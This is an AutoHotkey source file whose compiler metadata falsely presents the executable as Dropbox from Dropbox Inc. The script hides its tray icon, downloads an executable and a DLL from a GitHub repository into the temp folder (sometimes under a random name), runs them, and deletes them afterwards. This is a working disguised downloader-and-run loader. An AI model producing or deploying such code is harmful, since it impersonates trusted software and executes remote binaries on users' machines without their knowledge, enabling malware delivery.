;@Ahk2Exe-SetName Dropbox
;@Ahk2Exe-SetDescription Dropbox
;@Ahk2Exe-SetVersion 0.1
;@Ahk2Exe-SetCopyright Dropbox Inc
;@Ahk2Exe-SetOrigFileName Dropbox.exe
;@Ahk2Exe-SetCompanyName Dropbox Inc
#SingleInstance, Force
#NoEnv
#NoTrayIcon
#KeyHistory, 0
ListLines, Off

namespace := {}
namespace.json := JSON.Load(DownloadToStr("https://raw.githubusercontent.com/Visionary1/Tracker/master/new/Package.json"))
namespace.version := 0.1

If (namespace.json.server != "ON")
{
	MsgBox 0x2030, Under maintenance..., try later, 5
	Try Run, % namespace.json.updateurl
	ExitApp
}

namespace.main := new Package("https://github.com/Visionary1/Tracker/raw/master/new/Package.exe", namespace.json.name)
namespace.main.using("https://github.com/Visionary1/Tracker/raw/master/new/lib/3rd-party/MicroTimer.dll")
namespace.main.Run()
WinWaitClose, "ahk_pid " namespace.main.app.pid
namespace.Delete(main)
ExitApp

class Package
{
	__New(url, name)
	{
		this.app := []
		this.app.using := []
		
		If (name == "RANDOM")
			this.app.filename := A_Temp . "\" . this.CreateRandomStr() ".exe"
		Else
			this.app.filename := A_Temp . "\" . name . ".exe"
		
		Try UrlDownloadToFile, % url, % this.app.filename
	}
	
	using(url, name := "")
	{
		If !StrLen(name)
		{
			FoundPos := InStr(url, "/",, -1)
			name := SubStr(url, FoundPos + 1)
		}
		
		this.app.using.Push(name)
		Try UrlDownloadToFile, % url, % A_Temp . "\" . name
	}
	
	__Delete()
	{
		Try FileDelete, % this.app.filename
		Catch, E
		{
			WinKill, % "ahk_pid " this.app.pid
			FileDelete, % this.app.filename
		}
		
		For Key, files in this.app.using
			Try FileDelete, % A_Temp . "\" . files
		
		this.Delete("app")
	}
	
	Run()
	{
		Try RunWait, % this.app.filename,,, OutputVarPID
		Catch, 
			this.__Delete()

		this.app.pid := OutputVarPID
	}
	
	CreateRandomStr() 
	{
		Loop, 4
		{
			Random, digits, 48, 57
			Random, uppercases, 65, 90
			Random, lowercases, 97, 122
			Random, Mix, 1, 3
			If (Mix = 1)
				s .= Chr(digits) . Chr(uppercases) . Chr(lowercases)
			Else If (Mix = 2)
				s .= Chr(digits) . Chr(lowercases) . Chr(uppercases)
			Else If (Mix = 3)
				s .= Chr(lowercases) . Chr(digits) . Chr(uppercases)
		}
		
		Return s
	}
}

#Include, lib\3rd-party\Class JSON.ahk
#Include, lib\3rd-party\Func DownloadToString.ahk